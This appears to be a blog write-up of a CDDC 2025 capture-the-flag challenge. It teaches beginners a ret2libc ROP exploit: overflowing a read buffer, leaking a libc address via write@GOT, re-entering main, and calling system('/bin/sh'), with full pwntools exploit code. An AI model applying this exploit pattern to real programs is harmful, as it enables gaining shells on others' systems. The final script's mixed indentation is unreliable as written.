---
{"dg-publish":true,"permalink":"/ropasaurusrex-cddc-25/","tags":["gardenEntry"]}
---

# Ropasaurusrex CDDC 25
```
An old binary from a forgotten era still lingers in memory. 

You’ve found a vulnerability, but exploitation won’t be straightforward. 

Can you figure out how to make the binary do your bidding? 

nc <cddc link> 18317

# there is a 'chall' file attached
```

Welcome to my favorite challenge of CDDC 2025! Personally as a beginner this was insanely difficult, so I decided to do a writeup after I solved it, hopefully this will help beginner pwn-ers.

We are given chall file, this is what we see when we run it. (I'm on WSL)
![rop1.png](/img/user/rop1.png)
Note the Segmentation fault, it means we have to overflow with something to get the flag. Though the challenge name makes it obvious enough its a Return-oriented programming challenge (ROP). Check out `ret-to-libc` challenges for similar ideas.

Setup `pwndbg`
```bash
sudo apt install gdb -y

git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

gdb chall
# and you should now be in a gdb shell with the challenge loaded
run # run the chall file
```

Download [Ghidra](https://github.com/NationalSecurityAgency/ghidra/releases), load the chall file in, find the main function (side panel -> functions -> main).
![rop2.png](/img/user/rop2.png)
![rop3.png](/img/user/rop3.png)
As seen in the above screenshots, the code is pretty simple, read is our "entrypoint" for buffer overflow. 
Above the read function, there are 4 integers, 8 bytes each.
RBP is 8 bytes.
So the stack will look something like this:
RIP -- 8 bytes
RBP -- 8 bytes
4 local var (int) -- 32 bytes
read func -- entry point
Total bytes to overwrite = 40 = 0x28
The next 8 bytes after 0x28 will be whatever address we want to redirect the program to.
# ROP Gadgets
Scroll around vuln() function a little, you will see this gadget_space() function.
![rop4.png](/img/user/rop4.png)
Now this is important, its where our `pop rdi` addresses are at. They are known as ROP gadgets. 
Because `write()` and `read()` in C both needs 3 parameters, we need 3 registers to load the parameters in before we call write or read. From OS knowledge, `rdi`, `rsi`, `rdx` are the first three registers.
[ROPGadget Tool](https://github.com/JonathanSalwan/ROPgadget) Download this tool, use it to find the gadgets from your chall file.
![rop5.png](/img/user/rop5.png)
Oh no, we don't have `pop rdx` but its okay, the third parameter of write() is length of bytes to write out, as long as its more than 8, we can accept any garbage value that gets written here. 
8 because an address size is 8, and our aim is to leak the libc base address.
# Leak Libc Base Address
Global Offset Table (GOT) contains pointers to libc which move around because ASLR is turned on.
Libc is stored in GOT during runtime, we have to leak the base address while the program is running.

Current idea:
```c
write(1, read(), garbage_value_because_no_rdx)
# 1 means output to stdout (print to screen)
# read() refers to address of read@GOT
```
This will leak the address of `read()` derived from the GOT, which is also `libc base address` + `offset of read()`
We can find the `offset of read()` using:
```bash
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep read 
# 289: 000000000010dfa0 157 FUNC GLOBAL DEFAULT 15 read@@GLIBC_2.2.5
```
`leaked addr` - `offset of read()` = `libc base addr`
Now our payload to get the program to run our write command will look like this:
```
offset (40 bytes of 'A')
pop rdi
1
pop rsi
read@got
write@plt
```
Procedure Linkage Table (plt), basically functions (read, write) that already exist in the code (seen in Ghidra above) are in the plt. 
Find `write@plt` and `read@plt`
```bash
gdb chall
disass vuln # disassemble the vuln() function
```
![rop6.png](/img/user/rop6.png)
`write_plt = 0x401060`
`read_plt = 0x401070`
Find `read@got`
```
x/3i <read@plt address>
# it means show 3 instructions including read@plt
```
![rop7.png](/img/user/rop7.png)
`read_got = 0x404020`

First payload
```python
from pwn import * 
exe = ELF("chall") 
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") # change your libc addr
def conn(): 
	return process(exe.path) 
def main(): 
	r = conn()
	pop_rdi = 0x401176 
	pop_rsi = 0x401178 
	write_plt = 0x401060 
	read_plt = 0x401070 
	read_got = 0x404020

	payload = b"A" * 0x27  
	payload += b"B" # for debugging
	payload += struct.pack("<Q", pop_rdi) 
	payload += struct.pack("<Q", 0x1) 
	payload += struct.pack("<Q", pop_rsi) 
	payload += struct.pack("<Q", read_got) 
	payload += struct.pack("<Q", write_plt)
	r.sendline(payload)
	r.interactive()
if __name__ == "__main__": 
	main()
```
![rop8.png](/img/user/rop8.png)
So ideally if it works we should a bunch of bytes output, now if we take the first 8 bytes of that output, that is our leaked address of `read()` we are looking for. 
```python
leaked_bytes = r.recv(8) 
leak = u64(leaked_bytes.ljust(8, b'\x00')) # ensure 8 bytes 
log.success(f"libc leak: {hex(leak)}")
```
add this and this is our leaked libc address YAY!

But now the program ends, we don't even get to use the libc address to run `system('/bin/sh')`...
# Running main() again
```
gdb chall
disass main
```
![Pasted image 20250614030217.png](/img/user/Pasted%20image%2020250614030217.png)
First instruction of main has the address `0x40121f` so ideally after getting our libc address we want the program to loop the main function again, so it can read our second payload, which will then run `system('/bin/sh')` and give us a shell.

Now our payload is:
```
offset (40 bytes of 'A')
pop rdi
1
pop rsi
read@got
write@plt
address of main

addr_main = 0x40121f

payload = b"A" * 0x27  
...
payload += struct.pack("<Q", write_plt)
payload += struct.pack("<Q", addr_main) # add this
```
The result should look like this:
```
[*] Homage Ropasaurusrex
[+] libc leak: 0x7f75d272de90
[*] extra: b'P\xadj\xd2u\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0%\x81\xd2u\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x18\x81\xd2u\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Homage Ropasaurusrex\n'
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```
See the second 'Homage Ropasaurusrex' that's when you know its ready to take your second payload.

# Second payload

As I mentioned above, our goal is to run `system('/bin/sh')`
So we need the offset for `system` and `/bin/sh` 
```bash
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh 
# 1a7ea4 /bin/sh 
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system 
# 1481: 0000000000053110 45 FUNC WEAK DEFAULT 15 system@@GLIBC_2.2.5
```
Copy the addresses to our code.
```python
system_offset = 0x53110 # system@GLIBC_2.2.5 
binsh_offset = 0x1a7ea4 # address of "/bin/sh" string
```
`system()` takes 1 parameter, so `pop rdi` is enough.
Second payload:
```
Offset (40 bytes of 'A')
pop rdi
/bin/sh
system
```
So now the code should look like this (partial code):
```python
pop_rdi = 0x401176 
pop_rsi = 0x401178 

write_plt = 0x401060 
read_plt = 0x401070 
read_got = 0x404020 
addr_main = 0x40121f 

read_offset = 0x10dfa0
system_offset = 0x53110 
binsh_offset = 0x1a7ea4

payload = b"A" * 0x27 
payload += b"B" 
payload += struct.pack("<Q", pop_rdi) 
payload += struct.pack("<Q", 0x1) 
payload += struct.pack("<Q", pop_rsi) 
payload += struct.pack("<Q", read_got) 
payload += struct.pack("<Q", write_plt) 
payload += struct.pack("<Q", addr_main) 
r.sendline(payload) 

# capture the leak
leaked_bytes = r.recv(8) 
leak = u64(leaked_bytes.ljust(8, b'\x00')) # ensure 8 bytes 
log.success(f"libc leak: {hex(leak)}") 
remaining_output = r.recv(512) 

# second payload
libcbase = leak - read_offset
log.info(f"libc: {hex(libcbase)}") 
system = libcbase + system_offset
binsh = libcbase + binsh_offset 
payload2 = b"A" * 0x27 
payload2 += b"B" 
payload2 += struct.pack("<Q", pop_rdi) 
payload2 += struct.pack("<Q", binsh) 
payload2 += struct.pack("<Q", system) 
# gdb.attach(r)
r.sendline(payload2) 
r.interactive()
```
But when I run this, I encounter errors.
![Pasted image 20250614032605.png](/img/user/Pasted%20image%2020250614032605.png)
Run it with GDB, by attaching a `gdb.attach(r)` before `r.sendline(payload2)`.
It basically loads the code into GDB before you send your second payload. Slowly observe the program and enter `c` each time to "continue" execution.
![Pasted image 20250614035250.png](/img/user/Pasted%20image%2020250614035250.png)

Take a look at the bottom of the screenshot.
![Pasted image 20250614035411.png](/img/user/Pasted%20image%2020250614035411.png)
Basically when you see a `movaps` instruction, most likely there is a misaligned instruction. And this happens most often before calling functions. Notice we are calling `system`, so usually adding a `ret` gadget before it will help to solve this issue.
Find `ret` gadget
```
ROPgadget --binary chall | grep 'ret'
0x0000000000401176 : pop rdi ; ret
0x0000000000401178 : pop rsi ; ret
0x000000000040101a : ret 
# just take one of these, 0x40101a
```
The second payload should now look like this:
```
Offset (40 bytes of 'A')
pop rdi
/bin/sh
ret
system
```
Honestly if you are unsure where is misaligned, inserting `ret` randomly throughout the payload helps.

Final code
```python
from pwn import *
exe = ELF("chall")
libc = ELF("libc.so.6")
context.binary = exe
def conn():
    return process(exe.path)
def main():
    r = conn()
    log.info(r.recv().decode())
    # start your code here
    pop_rdi = 0x401176  
    pop_rsi = 0x401178
    ret = 0x40101a
    write_plt = 0x401060
    read_plt = 0x401070
    read_got = 0x404020
    addr_main = 0x40121f

	read_offset = 0x10dfa0
    system_offset = 0x53110  # system@GLIBC_2.2.5
    binsh_offset = 0x1a7ea4  # address of "/bin/sh" string

    # craft payload
    payload = b"A" * 0x27  # fill local vars
    payload += b"B"

    payload += struct.pack("<Q", pop_rdi)
    payload += struct.pack("<Q", 0x1)
    payload += struct.pack("<Q", pop_rsi)
    payload += struct.pack("<Q", read_got)
    payload += struct.pack("<Q", write_plt)
    payload += struct.pack("<Q", addr_main)

    r.sendline(payload)

	# leak libc base
    leaked_bytes = r.recv(8)
    leak = u64(leaked_bytes.ljust(8, b'\x00'))  # ensure 8 bytes
    log.success(f"libc leak: {hex(leak)}")
    remaining_output = r.recv(512)
    #log.info(f"extra: {remaining_output}")

	# second payload
    libcbase = leak - read_offset
    log.info(f"libc: {hex(libcbase)}")
    system = libcbase + system_offset
    binsh = libcbase + binsh_offset
    
    payload2 = b"A" * 0x27  # fill local vars
    payload2 += b"B"
    payload2 += struct.pack("<Q", pop_rdi)
    payload2 += struct.pack("<Q", binsh)
    payload2 += struct.pack("<Q", ret)
    payload2 += struct.pack("<Q", system)

    #gdb.attach(r)
    r.sendline(payload2)
    r.interactive()
    
if __name__ == "__main__":
    main()
```
Save and run the above using `python exploit.py`
And now we got shell access from the challenge YAY!
![Pasted image 20250614041055.png](/img/user/Pasted%20image%2020250614041055.png)
